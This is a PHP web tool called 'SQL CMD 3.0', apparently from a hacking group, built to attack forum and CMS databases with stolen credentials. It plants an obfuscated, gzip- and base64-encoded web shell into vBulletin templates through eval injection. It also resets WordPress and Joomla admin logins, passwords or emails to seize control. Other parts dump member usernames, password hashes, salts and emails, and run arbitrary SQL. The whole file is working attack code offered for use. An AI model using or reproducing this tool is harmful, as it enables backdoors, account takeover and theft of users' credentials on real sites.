<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<?
/*------------------------------------------------------------------*\
| ************        SQL_CMD 3.0 by al-swisre           ***********|
+-----------------------------------------------------------------|
|                   حقوق الملف محفوظة لـ al-swisre               |
|                            oy3@hotmail.com                    |
|                           Copyright ©2011 .                  |
\*-----------------------------------------------------------*/
?>
<head>
<title>SQL CMD 3.0 | al-swisre</title>
<meta http-equiv="content=type"  content="text/html; charset=utf-8" />
<style type="text/css">

  html,body {
     margin: 0;
     padding: 0;
     outline: 0;
}


body {
    direction: rtl;
 background-color: #000000;
	color: #cccccc;
     }

input,textarea,select{
font-weight: bold;
color: #cccccc;
dashed #ffffff;
border: 1px
solid #2C2C2C;
background-color: #080808
}


.all
{
  margin-left: auto;
  margin-right: auto;
  width: 60%;
  box-shadow: 0px 0px 4px #888888;
  direction: ltr;

}
.hdr{
  font-family:Tahoma, Arial, sans-serif;
  font-size: 27px;
  color:#BBBBBB;
  font-weight: bold;
  text-align: center;
}
.com{

  font-size: 18px;
  font-family:Tahoma, Arial, sans-serif;
  color: #BBBBBB;
  text-shadow: #FF0000;
}

.foter{
  font-size: 9pt;
  color:  #444444 ;
  text-align: center
}
#drp{
  width:150px;
  position: absolute;

  float: none;

}


#rok{
  text-decoration: none;
  padding : 4px;
  list-style: none;
  float: left;
}
#rok a{
  text-decoration: none;
  color: #cccccc;
  font-size: 10pt;
  margin-left: 2px;
  list-style: none;
  padding : 4px;

}
.nvbr{
  border-top: 1px #222222 dashed;
  height: 33px;
  background: #000000;
  border-bottom: 1px #222222 dashed;
  font-family: Tahoma, Arial, sans-serif ;
  font-weight: bold;
}

.nvbr ul{
 list-style: none;
 margin: 0;
 padding: 0;

}

.nvbr ul li{
  float: left;

}

.nvbr ul li a{
 display: block;
 text-decoration: none;
 padding: 10px 9px 10px 9px;
  color: #999999   ;
  font-size: 12px;
}

.nvbr ul li a:hover{
 color: #FFFFFF;
 box-shadow: 0px 0px 3px #cccccc ;
 text-shadow: 0px 0px 3px #FFFFFF;
}

#drp{
 list-style: none;
 direction: ltr;
  width:150px;
  position: absolute;
  display: none;
  border-bottom:solid 1px #222222;
  border-left: solid 1px #222222;
  border-right: solid 1px #222222;
}

#drp{
  float: none;
}

#rok:hover #drp{
 display: block;
 background: #000000;
 }
 .tbm{
 font-size: 14px;
}

.tbm tr td{
 border: dashed 1px #111111;

}





</style>
</head>

<body>
<br />
<div class="all" >

<br /><div class="hdr">SQL CMD 3.0</div><br />
<?php
$peag = basename(__FILE__);

echo'
<div class="nvbr">
 <ul>
 <li><a href="'.$peag.'">SQL CMD</a>

 </li>
 </ul>

 <ul>
 <li id="rok"><a href="">vBulletin</a>

 <div id="drp">
 <ul><a href="?sws=1" >Inject index</a> </ul>
 <ul><a href="?sws=4" >Inject faq</a> </ul>
 <ul><a href="?sws=5" >Inject calendar</a> </ul>
 <ul><a href="?sws=6" >Inject search</a> </ul>
 <ul><a href="?sws=7" >show members</a> </ul>
 </div>

 </li>
 </ul>

  </ul>

 <ul>
 <li id="rok"><a href="">WordPress</a>

 <div id="drp">
 <ul><a href="?sws=2" >Change admin</a> </ul>
 <ul><a href="?sws=8" >show members</a> </ul>
 </div>

 </li>
 </ul>

  <ul>
 <li id="rok"><a href="">Joomla</a>

 <div id="drp">
 <ul><a href="?sws=3" >Change admin</a> </ul>
 <ul><a href="?sws=9" >show members</a> </ul>
 </div>

 </li>
 </ul>

</div>';
?>

<?php


$shell = "bVDPS8MwFL4L/g+vYZAWdPPiaUv14kAQFKqnUUqapjSYNKFJxCn7322abgzcIfDyvl+P7/qKs04D3tS5sJ96MMJ9b+ohDw8vTWcq31PF02yJp/WqzvEaZk2rBwWUOaF7ghAo7jrdEGS0dQh4z9zecIKUl04YOrhV4N821FEEwZQgb6SmDR8QiObsdxYheuMdRKNWSH5UxtmKn3G+v0P5TIxgNTqhWWR9rYSLAXH/RaUfgY8pbVROZ4VI0aawqN5ei/cdDlRcAiFwJEIGv4HyyLTZp4tq+/zyVOxwOASXO+yUqUI6Lm/gHxiBLDic6o62UHjGuLWQJEko99T9Gg7ApeUXJFsq5EX+AR7yPw==" ;

if(isset($_REQUEST['sws']))
{

switch ($_REQUEST['sws'])
{

case 1:

echo '

<div class="com">
<form method="post">
<table cellpadding="4" align="center" width="35%" class="tab">
 <br />

<tr">
     <td>Host :</td>
     <td><input type="text" name="host" value="localhost" /></td>
</tr>

<tr ">
     <td>user&nbsp;:</td>
     <td><input type="text" name="user" /></td>
</tr>

<tr>
     <td>Pass :</td><td><input type="text" name="pass"/></td>

</tr>

<tr>
     <td>db&nbsp;&nbsp;&nbsp;:</td>
     <td><input type="text" name="db" /></td>
</tr>
</table>
<table class="tab2" cellpadding="4" align="center" width="45%">
<tr>
     <td >Your index :</td>
     <td><textarea rows="3" name="index"></textarea></td>
</tr>


<tr>

      <td colspan="6" align="center" width="70%"> <input type="submit" value="SQL" maxlength="30" />  <input type="reset" value="clear" maxlength="30" /> </td>

</tr>
  </table>
 </form>  </div>';
// <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< vb >>>>>>>>>>>>>>>>>>>>>>>>
 $host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db   = $_POST['db'];
$index  = $_POST['index'];

if(isset($host) ) {
$con =@ mysql_connect($host,$user,$pass) or die ;
$sedb =@ mysql_select_db($db) or die;
$index=str_replace("\'","'",$index);
$crypt  = "{\${eval(base64_decode(\'";
$crypt .= base64_encode("echo \"$index\";");
$crypt .= "\'))}}{\${exit()}}</textarea>";
$sqlindex = "UPDATE `template` SET `template` = '$crypt'" or die;
$query =@ mysql_query($sqlindex,$con);

if ($query)
{
  echo "<center><br /><div class='com'>~_^ تم الاستعلام<br /><br /></div></center>";
}
else if (!$query)
{
  echo "error";
}

}else
{
  echo "<center><br /><div class='com'>! ادخل بيانات القاعدة <br /><br /></div></center>";
}
  break;


// <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< wp >>>>>>>>>>>>>>>>>>>>>>>>

  case 2:

  echo '

<div class="com">
<form method="post">
<table cellpadding="4" align="center" width="35%" class="tab">
 <br />

<tr">
     <td>Host :</td>
     <td><input type="text" name="host" value="localhost" /></td>
</tr>

<tr ">
     <td>user&nbsp;:</td>
     <td><input type="text" name="user" /></td>
</tr>

<tr>
     <td>Pass :</td><td><input type="text" name="pass"/></td>

</tr>

<tr>
     <td>db&nbsp;&nbsp;&nbsp;:</td>
     <td><input type="text" name="db" /></td>
</tr>
</table>
<table cellpadding="4" align="center" width="45%" class="tab">

<tr>
     <td>user admin&nbsp;&nbsp;&nbsp;:</td>
     <td><input type="text" name="useradmin" /></td>
</tr>
<tr>
     <td>pass admin&nbsp;&nbsp;&nbsp;:</td>
     <td><input type="text" name="passadmin" /></td>
</tr>

<tr>

      <td colspan="6" align="center" width="70%"> <input type="submit" value="SQL" maxlength="30" />  <input type="reset" value="clear" maxlength="30" /> </td>

</tr>
  </table>
 </form> </div>';

$host       = $_POST['host'];
$user       = $_POST['user'];
$pass       = $_POST['pass'];
$db         = $_POST['db'];
$useradmin  = $_POST['useradmin'];
$pass_ad    = $_POST['passadmin'];



if(isset($host) ) {
$con =@ mysql_connect($host,$user,$pass) or die ;
$sedb =@ mysql_select_db($db) or die;

$crypt = crypt($pass_ad);


$query =@mysql_query("UPDATE `wp_users` SET `user_login` ='".$useradmin."' WHERE ID = 1") or die;
$query =@mysql_query("UPDATE `wp_users` SET `user_pass` ='".$crypt."' WHERE ID = 1") or die;



if ($query)
{
  echo "<center><br /><div class='com'>~_^ تم الاستعلام<br /><br /></div></center>";
}
else if (!$query)
{
  echo "error";
}

}else
{
  echo "<center><br /><div class='com'>! ادخل بيانات القاعدة <br /><br /></div></center>";
}



  break;



// <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< joomla >>>>>>>>>>>>>>>>>>>>>>>>

  case 3:
  echo '

<div class="com">
<form method="post">
<table cellpadding="4" align="center" width="35%" class="tab">
 <br />

<tr">
     <td>Host :</td>
     <td><input type="text" name="host" value="localhost" /></td>
</tr>

<tr ">
     <td>user&nbsp;:</td>
     <td><input type="text" name="user" /></td>
</tr>

<tr>
     <td>Pass :</td><td><input type="text" name="pass"/></td>

</tr>

<tr>
     <td>db&nbsp;&nbsp;&nbsp;:</td>
     <td><input type="text" name="db" /></td>
</tr>
</table>
<table cellpadding="4" align="center" width="50%" class="tab">

<tr>
     <td>dbprefix&nbsp;&nbsp;&nbsp;&nbsp;:</td>
     <td><input type="text" name="jop" value="jos_users" /></td>
</tr>


<tr>
     <td>Email admin&nbsp;&nbsp;&nbsp;:</td>
     <td><input type="text" name="email" /></td>
</tr>


<tr>

      <td colspan="6" align="center" width="70%"> <input type="submit" value="SQL" maxlength="30" />  <input type="reset" value="clear" maxlength="30" /> </td>

</tr>
  </table>
 </form> </div>';

$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db   = $_POST['db'];
$jop  = $_POST['jop'];
$email  = $_POST['email'];

if(isset($host) ) {
$con =  @ mysql_connect($host,$user,$pass) or die ;
$sedb = @ mysql_select_db($db) or die;


$query= @ mysql_query("UPDATE $jop SET email ='".$email."' WHERE id = 1") or die;



if ($query)
{
  echo "<center><br /><div class='com'>~_^ تم الاستعلام<br /><br /></div></center>";
}
else if (!$query)
{
  echo "error";
}

}else
{
  echo "<center><br /><div class='com'>! ادخل بيانات القاعدة <br /><br /></div></center>";
}


  break;
// <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< vb shell FAQ >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
  case 4:
  echo '

<div class="com">
<form method="post">
<table cellpadding="4" align="center" width="35%" class="tab">
 <br />

<tr">
     <td>Host :</td>
     <td><input type="text" name="host" value="localhost" /></td>
</tr>

<tr ">
     <td>user&nbsp;:</td>
     <td><input type="text" name="user" /></td>
</tr>

<tr>
     <td>Pass :</td><td><input type="text" name="pass"/></td>

</tr>

<tr>
     <td>db&nbsp;&nbsp;&nbsp;:</td>
     <td><input type="text" name="db" /></td>
</tr>

</table>
<table class="tab2" cellpadding="4" align="center" width="45%">
<tr>
      <td> <br /><center>Injection Shell in faq.php</center><br /> </td>
</tr>

<tr>

      <td colspan="6" align="center" width="70%"> <input type="submit" value="SQL" maxlength="30" />  <input type="reset" value="clear" maxlength="30" /> </td>

</tr>
  </table>
 </form>  </div>';

$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db   = $_POST['db'];
$faq  = $_POST['index'];

if(isset($host) ) {
$con =@ mysql_connect($host,$user,$pass) or die ;
$sedb =@ mysql_select_db($db) or die;
$crypt  = "{\${eval(gzinflate(base64_decode(\'";
$crypt .= "$shell";
$crypt .= "\')))}}{\${exit()}}</textarea>";
$sqlfaq="UPDATE template SET template ='".$crypt."' WHERE title ='FAQ'" ;
$query =@ mysql_query($sqlfaq,$con);

if ($query)
{
  echo "<center><br /><div class='com'>~_^ تم الاستعلام<br /><br /></div></center>";
}
else if (!$query)
{
  echo "error";
}

}else
{
  echo "<center><br /><div class='com'>! ادخل بيانات القاعدة <br /><br /></div></center>";
}
  break;



// <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< vb shell CALENDAR >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
  case 5:
echo '

<div class="com">
<form method="post">
<table cellpadding="4" align="center" width="35%" class="tab">
 <br />

<tr">
     <td>Host :</td>
     <td><input type="text" name="host" value="localhost" /></td>
</tr>

<tr ">
     <td>user&nbsp;:</td>
     <td><input type="text" name="user" /></td>
</tr>

<tr>
     <td>Pass :</td><td><input type="text" name="pass"/></td>

</tr>

<tr>
     <td>db&nbsp;&nbsp;&nbsp;:</td>
     <td><input type="text" name="db" /></td>
</tr>
</table>
<table class="tab2" cellpadding="4" align="center" width="45%">
<tr>
      <td> <br /><center>Injection Shell in calendar.php</center><br /> </td>
</tr>


<tr>

      <td colspan="6" align="center" width="70%"> <input type="submit" value="SQL" maxlength="30" />  <input type="reset" value="clear" maxlength="30" /> </td>

</tr>
  </table>
 </form>  </div>';
//
$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db   = $_POST['db'];
$index  = $_POST['index'];

if(isset($host) ) {
$con =@ mysql_connect($host,$user,$pass) or die ;
$sedb =@ mysql_select_db($db) or die;
$crypt  = "{\${eval(gzinflate(base64_decode(\'";
$crypt .= "$shell";
$crypt .= "\')))}}{\${exit()}}</textarea>";
$sqlfaq="UPDATE template SET template ='".$crypt."' WHERE title ='CALENDAR'" ;
$query =@ mysql_query($sqlfaq,$con);

if ($query)
{
  echo "<center><br /><div class='com'>~_^ تم الاستعلام<br /><br /></div></center>";
}
else if (!$query)
{
  echo "error";
}

}else
{
  echo "<center><br /><div class='com'>! ادخل بيانات القاعدة <br /><br /></div></center>";
}
  break;

// <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< vb shell search >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

  case 6:
echo '

<div class="com">
<form method="post">
<table cellpadding="4" align="center" width="35%" class="tab">
 <br />

<tr">
     <td>Host :</td>
     <td><input type="text" name="host" value="localhost" /></td>
</tr>

<tr ">
     <td>user&nbsp;:</td>
     <td><input type="text" name="user" /></td>
</tr>

<tr>
     <td>Pass :</td><td><input type="text" name="pass"/></td>

</tr>

<tr>
     <td>db&nbsp;&nbsp;&nbsp;:</td>
     <td><input type="text" name="db" /></td>
</tr>
<table class="tab2" cellpadding="4" align="center" width="45%">
<tr>
      <td> <br /><center>Injection Shell in search.php</center><br /> </td>
</tr>


<tr>

      <td colspan="6" align="center" width="70%"> <input type="submit" value="SQL" maxlength="30" />  <input type="reset" value="clear" maxlength="30" /> </td>

</tr>
  </table>
 </form>  </div>';

$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db   = $_POST['db'];
$index  = $_POST['index'];

if(isset($host) ) {
$con =@ mysql_connect($host,$user,$pass) or die ;
$sedb =@ mysql_select_db($db) or die;
$crypt  = "{\${eval(gzinflate(base64_decode(\'";
$crypt .= "$shell"; 
$crypt .= "\')))}}{\${exit()}}</textarea>";
$sqlfaq="UPDATE template SET template ='".$crypt."' WHERE title ='search_forums'" ;
$query =@ mysql_query($sqlfaq,$con);

if ($query)
{
  echo "<center><br /><div class='com'>~_^ تم الاستعلام<br /><br /></div></center>";
}
else if (!$query)
{
  echo "error";
}

}else
{
  echo "<center><br /><div class='com'>! ادخل بيانات القاعدة <br /><br /></div></center>";
}
  break;


// <<<<<<<<<<<<<<<<<<<<<< vb members >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
  case 7:

  echo '

<div class="com">
<form method="post">
<table cellpadding="4" align="center" width="35%" class="tab">
 <br />

<tr">
     <td>Host :</td>
     <td><input type="text" name="host" value="localhost" /></td>
</tr>

<tr ">
     <td>user&nbsp;:</td>
     <td><input type="text" name="user" /></td>
</tr>

<tr>
     <td>Pass :</td><td><input type="text" name="pass"/></td>

</tr>

<tr>
     <td>db&nbsp;&nbsp;&nbsp;:</td>
     <td><input type="text" name="db" /></td>
</tr>
<table class="tab2" cellpadding="4" align="center" width="45%">
<tr>
      <td> <br /><center>show members Information</center><br /> </td>
</tr>


<tr>

      <td colspan="6" align="center" width="70%"> <input type="submit" value="SQL" maxlength="30" />  <input type="reset" value="clear" maxlength="30" /> </td>

</tr>
  </table>
 </form>  </div>';

$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db   = $_POST['db'];
$index  = $_POST['index'];

if(isset($host) ) {
$con =@ mysql_connect($host,$user,$pass) or die ;
$sedb =@ mysql_select_db($db) or die;
$sql = 'select * from `user`';
$query =@ mysql_query($sql,$con);

if ($query)
{

while ($row = mysql_fetch_assoc($query))
{

echo "
<br /><br /><table cellpadding='4' cellspacing='4' align='center' class='tbm'>
<tr>
       <td>ID :</td>
       <td>user :</td>
       <td>pass :</td>
       <td>salt :</td>
       <td>email :</td>

</tr>

<tr>
       <td>".$row['userid']."</td>
       <td>".$row['username']."</td>
       <td>".$row['password']."</td>
        <td>".$row['salt']."</td>
        <td>".$row['email']."</td>
</tr>

</table>
                                                     -
  ";

}

  }
else if (!$query)
{
  echo "error";
}

}else
{
  echo "<center><br /><div class='com'>! ادخل بيانات القاعدة <br /><br /></div></center>";
}


  break;

  case 8:


  echo '

<div class="com">
<form method="post">
<table cellpadding="4" align="center" width="35%" class="tab">
 <br />

<tr">
     <td>Host :</td>
     <td><input type="text" name="host" value="localhost" /></td>
</tr>

<tr ">
     <td>user&nbsp;:</td>
     <td><input type="text" name="user" /></td>
</tr>

<tr>
     <td>Pass :</td><td><input type="text" name="pass"/></td>

</tr>

<tr>
     <td>db&nbsp;&nbsp;&nbsp;:</td>
     <td><input type="text" name="db" /></td>
</tr>
<table class="tab2" cellpadding="4" align="center" width="45%">
<tr>
      <td> <br /><center>show members Information</center><br /> </td>
</tr>


<tr>

      <td colspan="6" align="center" width="70%"> <input type="submit" value="SQL" maxlength="30" />  <input type="reset" value="clear" maxlength="30" /> </td>

</tr>
  </table>
 </form>  </div>';

$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db   = $_POST['db'];
$index  = $_POST['index'];

if(isset($host) ) {
$con =@ mysql_connect($host,$user,$pass) or die ;
$sedb =@ mysql_select_db($db) or die;
$sql = 'select * from `wp_users`';
$query =@ mysql_query($sql,$con);

if ($query)
{

while ($row = mysql_fetch_assoc($query))
{

echo "
<br /><br /><table cellpadding='4' cellspacing='4' align='center' class='tbm'>
<tr>
       <td>ID :</td>
       <td>user :</td>
       <td>pass :</td>
       <td>email :</td>

</tr>

<tr>
       <td>".$row['ID']."</td>
       <td>".$row['user_login']."</td>
       <td>".$row['user_pass']."</td>
        <td>".$row['user_email']."</td>
</tr>

</table>

  ";

}

  }
else if (!$query)
{
  echo "error";
}

}else
{
  echo "<center><br /><div class='com'>! ادخل بيانات القاعدة <br /><br /></div></center>";
}


  break;


    case 9:


  echo '

<div class="com">
<form method="post">
<table cellpadding="4" align="center" width="35%" class="tab">
 <br />

<tr">
     <td>Host :</td>
     <td><input type="text" name="host" value="localhost" /></td>
</tr>

<tr ">
     <td>user&nbsp;:</td>
     <td><input type="text" name="user" /></td>
</tr>

<tr>
     <td>Pass :</td><td><input type="text" name="pass"/></td>

</tr>

<tr>
     <td>db&nbsp;&nbsp;&nbsp;:</td>
     <td><input type="text" name="db" /></td>
</tr>
</table>
<table class="tab2" cellpadding="4" align="center" width="45%">


<tr>
     <td>Table user :</td>
     <td colspan="6"><input type="text" name="jop" value="jos_users" /></td>
</tr>
</table>

<table class="tab2" cellpadding="4" align="center" width="45%">
<tr>
      <td> <br /><center>show members Information</center><br /> </td>
</tr>


<tr>

      <td colspan="6" align="center" width="70%"> <input type="submit" value="SQL" maxlength="30" />  <input type="reset" value="clear" maxlength="30" /> </td>

</tr>
  </table>
 </form>  </div>';

$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db   = $_POST['db'];
$jop  = $_POST['jop'];

if(isset($host) ) {
$con =@ mysql_connect($host,$user,$pass) or die ;
$sedb =@ mysql_select_db($db) or die;
$sql = 'select * from `bo74r_users`';
$query =@ mysql_query($sql,$con);

if ($query)
{

while ($row = mysql_fetch_assoc($query))
{

echo "
<br /><br /><table cellpadding='4' cellspacing='4' align='center' class='tbm'>
<tr>
       <td>ID :</td>
       <td>user :</td>
       <td>pass :</td>
       <td>email :</td>

</tr>

<tr>
       <td>".$row['id']."</td>
       <td>".$row['username']."</td>
       <td>".$row['password']."</td>
        <td>".$row['email']."</td>
</tr>

</table>

  ";

}

  }
else if (!$query)
{
  echo "error";
}

}else
{
  echo "<center><br /><div class='com'>! ادخل بيانات القاعدة <br /><br /></div></center>";
}


  break;






  default:
  header("Location: $peag");



  }
  }



else
{
echo '

<div class="com">
<form method="post">
<table cellpadding="4" align="center" width="35%" class="tab">
 <br />

<tr">
     <td>Host :</td>
     <td><input type="text" name="host" value="localhost" /></td>
</tr>

<tr ">
     <td>user&nbsp;:</td>
     <td><input type="text" name="user" /></td>
</tr>

<tr>
     <td>Pass :</td><td><input type="text" name="pass"/></td>

</tr>

<tr>
     <td>db&nbsp;&nbsp;&nbsp;:</td>
     <td><input type="text" name="db" /></td>
</tr>
</table>
<table class="tab2" cellpadding="4" align="center" width="45%">
<tr>
     <td >SQL CMD :</td>
     <td><textarea rows="3" name="sql"></textarea></td>
</tr>


<tr>

      <td colspan="6" align="center" width="70%"> <input type="submit" value="SQL" maxlength="30" />  <input type="reset" value="clear" maxlength="30" /> </td>

</tr>
  </table>
 </form> </div>';

$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db   = $_POST['db'];
$sql  = $_POST['sql'];

if(isset($host) ) {
$con =@ mysql_connect($host,$user,$pass) or die ;
$sedb =@ mysql_select_db($db) or die;

$query =@ mysql_query($sql,$con) or die;

if ($query)
{
  echo "<center><br /><div class='com'>~_^ تم الاستعلام<br /><br /></div></center>";
}
else if (!$query)
{
  echo "error";
}

}else
{
  echo "<center><br /><div class='com'>! ادخل بيانات القاعدة <br /><br /></div></center>";
}
}
?>

</div>

<div class="foter"><br /><br />Cod3d by : al-swisre _ oy3@hotmail.com<br /> <br />Saudi Arabia h4x0rS</div>
<br />
<!--
/*------------------------------------------------------------------*\
| ************          SQL_CMD 3.0 by al-swisre        *********** |
+------------------------------------------------------------------+
|                   حقوق الملف محفوظة لـ al-swisre                |
|                            oy3@hotmail.com                     |
|                           Copyright ©2011 .                   |
\*-----------------------------------------------------------*/
->
</body>

</html>
